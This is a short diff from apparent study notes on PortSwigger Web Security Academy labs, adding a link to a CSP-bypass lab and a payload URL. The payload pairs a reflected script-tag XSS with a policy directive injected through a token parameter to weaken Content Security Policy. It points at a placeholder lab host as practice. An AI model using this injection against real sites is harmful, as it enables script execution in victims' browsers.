@@ -12,3 +12,10 @@ https://portswigger.net/web-security/csrf/lab-no-defenses
      </script>
   </body>
 </html>
+
+
+
+
+https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
+
+https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
